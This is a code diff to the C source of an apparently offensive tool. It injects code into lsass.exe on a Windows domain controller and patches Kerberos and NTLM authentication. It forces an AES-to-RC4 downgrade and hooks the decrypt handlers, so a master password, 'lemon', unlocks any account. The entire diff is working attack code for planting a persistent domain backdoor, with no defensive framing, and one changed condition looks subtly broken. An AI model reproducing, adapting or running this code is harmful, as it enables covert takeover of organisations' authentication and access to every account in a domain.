@@ -121,7 +121,7 @@ BOOL Skel_InstallOnKerbAuth(DWORD processID, HANDLE hProcess)
 	BOOL aesPackagesDisabled = FALSE;
 	LPVOID Buffer = 0, RemoteFunctions = 0, pInitialize = 0, pDecrypt = 0;
 	SIZE_T szFunc = (SIZE_T)((PBYTE)Skel_rc4_end - (PBYTE)Skel_rc4_init);
-	unsigned char patch[] = "\xff";
+	unsigned char patch[] = "\xff\x00\x00\x00";
 	SK_FUNCTION_PTR RemotePtrs[] = {
 		{L"ntdll.dll", "memcpy", (PVOID)0x4141414141414141, NULL},
 		{L"kernel32.dll", "LocalAlloc", (PVOID)0x4242424242424242, NULL},
@@ -130,76 +130,83 @@ BOOL Skel_InstallOnKerbAuth(DWORD processID, HANDLE hProcess)
 		{NULL, NULL, (PVOID)0x4b4b4b4b4b4b4b4b, NULL} // decrypt
 	};
 
-	LocalCryptdllBase = GetModuleHandle(cryptdll);
-	if (LocalCryptdllBase == NULL)
+	if (Skel_GetRemoteModuleInformation(processID, L"kdcsvc.dll", &pCryptInfo))
 	{
-		LocalCryptdllBase = LoadLibrary(cryptdll);
-	}
-	if (LocalCryptdllBase != NULL)
-	{
-		CDLocateCSystem = (PCDLOCATECSYSTEM)GetProcAddress(LocalCryptdllBase, "CDLocateCSystem");
-		if (CDLocateCSystem != 0)
+		SecureZeroMemory(&pCryptInfo, sizeof(SK_MODULE_INFORMATION));
+		LocalCryptdllBase = GetModuleHandle(cryptdll);
+		if (LocalCryptdllBase == NULL)
 		{
-			if ((NT_SUCCESS(CDLocateCSystem(0x11, &pCrypt_aes128))) && (NT_SUCCESS(CDLocateCSystem(0x12, &pCrypt_aes256))))
-			{
-				PRINT_SUCCESS(L"Packages : AES128 : 0x%-016p <--> 0x%-016p : AES256\n", pCrypt_aes128, pCrypt_aes256);
-				if (
-					WriteProcessMemory(hProcess, (LPVOID)((PBYTE)pCrypt_aes128 + FIELD_OFFSET(KERB_ECRYPT, EncryptionType)), patch, sizeof(ULONG), NULL) &&
-					WriteProcessMemory(hProcess, (LPVOID)((PBYTE)pCrypt_aes256 + FIELD_OFFSET(KERB_ECRYPT, EncryptionType)), patch, sizeof(ULONG), NULL)
-					)
-				{
-					aesPackagesDisabled = TRUE;
-				}
-			}
-			else
-				PRINT_ERROR(L"AES packages not found.\n");
+			LocalCryptdllBase = LoadLibrary(cryptdll);
 		}
-	}
-			
-	if (aesPackagesDisabled)
-	{
-		PRINT_SUCCESS(L"AES packages patched. Fallback to RC4 expected.\n");
-		if (NT_SUCCESS(CDLocateCSystem(KERB_ETYPE_RC4_HMAC_NT, &pCrypt)))
+		if (LocalCryptdllBase != NULL)
 		{
-			PRINT_SUCCESS(L"KERB_ETYPE_RC4_HMAC_NT located: 0x%-016p\n", pCrypt);
-			Buffer = (LPVOID)LocalAlloc(LPTR, szFunc);
-			if (Buffer != NULL)
+			CDLocateCSystem = (PCDLOCATECSYSTEM)GetProcAddress(LocalCryptdllBase, "CDLocateCSystem");
+			if (CDLocateCSystem != 0)
 			{
-				RtlCopyMemory(Buffer, Skel_rc4_init, szFunc);
-				RemotePtrs[3].Ptr = pCrypt->Initialize;
-				RemotePtrs[4].Ptr = pCrypt->Decrypt;
-				RemoteFunctions = Skel_ResolveFakeFunctionPointers(hProcess, Buffer, (DWORD)szFunc, (PSK_FUNCTION_PTR)&RemotePtrs, (DWORD)(sizeof(RemotePtrs) / sizeof(SK_FUNCTION_PTR)), TRUE);
-				if (RemoteFunctions != NULL)
+				if ((NT_SUCCESS(CDLocateCSystem(0x11, &pCrypt_aes128))) && (NT_SUCCESS(CDLocateCSystem(0x12, &pCrypt_aes256) == 0)))
 				{
-					PRINT_SUCCESS(L"Handlers up and ready\n");
-					pInitialize = RemoteFunctions;
-					pDecrypt = (LPVOID)((DWORD_PTR)RemoteFunctions + (DWORD)((DWORD_PTR)Skel_rc4_init_decrypt - (DWORD_PTR)Skel_rc4_init));
+					PRINT_SUCCESS(L"Packages : AES128 : 0x%-016p | 0x%-016p : AES256\n", pCrypt_aes128, pCrypt_aes256);
 					if (
-						(WriteProcessMemory(hProcess, (LPVOID)((DWORD_PTR)pCrypt + FIELD_OFFSET(KERB_ECRYPT, Initialize)), (LPCVOID)&pInitialize, sizeof(PVOID), NULL)) &&
-						(WriteProcessMemory(hProcess, (LPVOID)((DWORD_PTR)pCrypt + FIELD_OFFSET(KERB_ECRYPT, Decrypt)), (LPCVOID)&pDecrypt, sizeof(PVOID), NULL))
+						WriteProcessMemory(hProcess, (LPVOID)((PBYTE)pCrypt_aes128 + FIELD_OFFSET(KERB_ECRYPT, EncryptionType)), patch, sizeof(ULONG), NULL) &&
+						WriteProcessMemory(hProcess, (LPVOID)((PBYTE)pCrypt_aes256 + FIELD_OFFSET(KERB_ECRYPT, EncryptionType)), patch, sizeof(ULONG), NULL)
 						)
 					{
-						PRINT_SUCCESS(L"Connectors ok\n");
-						status = TRUE;
-					}
-					else
-					{
-						PRINT_ERROR(L"Patching error. Freeing memory...\n");
-						VirtualFreeEx(hProcess, RemoteFunctions, 0, MEM_RELEASE);
+						aesPackagesDisabled = TRUE;
 					}
 				}
 				else
-					PRINT_ERROR(L"Remote function building error.\n");
+					PRINT_ERROR(L"AES packages not found\n");
+			}
+		}
+
+		if (aesPackagesDisabled)
+		{
+			PRINT_SUCCESS(L"AES packages patched. Fallback to RC4 expected.\n");
+			if (NT_SUCCESS(CDLocateCSystem(KERB_ETYPE_RC4_HMAC_NT, &pCrypt)))
+			{
+				PRINT_SUCCESS(L"KERB_ETYPE_RC4_HMAC_NT located: 0x%-016p\n", pCrypt);
+				Buffer = (LPVOID)LocalAlloc(LPTR, szFunc);
+				if (Buffer != NULL)
+				{
+					RtlCopyMemory(Buffer, Skel_rc4_init, szFunc);
+					RemotePtrs[3].Ptr = pCrypt->Initialize;
+					RemotePtrs[4].Ptr = pCrypt->Decrypt;
+					RemoteFunctions = Skel_ResolveFakeFunctionPointers(hProcess, Buffer, (DWORD)szFunc, (PSK_FUNCTION_PTR)&RemotePtrs, (DWORD)(sizeof(RemotePtrs) / sizeof(SK_FUNCTION_PTR)), TRUE);
+					if (RemoteFunctions != NULL)
+					{
+						PRINT_SUCCESS(L"Handlers up and ready\n");
+						pInitialize = RemoteFunctions;
+						pDecrypt = (LPVOID)((DWORD_PTR)RemoteFunctions + (DWORD)((DWORD_PTR)Skel_rc4_init_decrypt - (DWORD_PTR)Skel_rc4_init));
+						if (
+							(WriteProcessMemory(hProcess, (LPVOID)((DWORD_PTR)pCrypt + FIELD_OFFSET(KERB_ECRYPT, Initialize)), (LPCVOID)&pInitialize, sizeof(PVOID), NULL)) &&
+							(WriteProcessMemory(hProcess, (LPVOID)((DWORD_PTR)pCrypt + FIELD_OFFSET(KERB_ECRYPT, Decrypt)), (LPCVOID)&pDecrypt, sizeof(PVOID), NULL))
+							)
+						{
+							PRINT_SUCCESS(L"Connectors patched. Master password set to 'lemon'\n");
+							status = TRUE;
+						}
+						else
+						{
+							PRINT_ERROR(L"Patching error. Freeing memory...\n");
+							VirtualFreeEx(hProcess, RemoteFunctions, 0, MEM_RELEASE);
+						}
+					}
+					else
+						PRINT_ERROR(L"Remote function building error.\n");
+				}
+				else
+					PRINT_ERROR(L"Heap allocation error.\n");
 			}
 			else
-				PRINT_ERROR(L"Heap allocation error.\n");
+				PRINT_ERROR(L"CDLocateCSystem error.\n");
 		}
 		else
-			PRINT_ERROR(L"CDLocateCSystem error.\n");
+			PRINT_ERROR(L"RC4 downgrading error.\n");
 	}
 	else
-		PRINT_ERROR(L"RC4 downgrading error.\n");
-			
+		PRINT_ERROR(L"kdcsvc.dll not found in %d. Is it a domain controller?", processID);
+
+	FreeLibrary(LocalCryptdllBase);
 	CloseHandle(hProcess);
 
 	return status;
@@ -246,7 +253,7 @@ BOOL Skel_InstallOnNtlmAuth(DWORD processID, HANDLE hProcess)
 							PRINT_SUCCESS(L"Pattern area is now -RW-\n");
 							if (WriteProcessMemory(hProcess, pattern_data, (LPCVOID)&RemoteFunctions, sizeof(PVOID), NULL))
 							{
-								PRINT_SUCCESS(L"Connector patched\n");
+								PRINT_SUCCESS(L"Connectors patched. Master password set to 'lemon'\n");
 							}
 							else
 							{
@@ -324,7 +331,7 @@ BOOL wmain(int argc, wchar_t* argv[])
 		}
 		else
 		{
-			PRINT_ERROR(L"lsass.exe. PID not found (?)... Aborting.\n");
+			PRINT_ERROR(L"lsass.exe PID not found (?)... Aborting.\n");
 			return FALSE;
 		}
 	}
@@ -333,8 +340,8 @@ help:
 	wprintf(
 		L"\nUsage: %s {mode}\n\n"
 		L"Modes:\n"
-		L"--KerbAuth\t(patch Kerberos authentication)\n"
-		L"--NtlmAuth\t(patch NTLM authentication)\n",
+		L"--KerbAuth\tpatch Kerberos authentication\n"
+		L"--NtlmAuth\tpatch NTLM authentication\n",
 		argv[0]
 	);
 
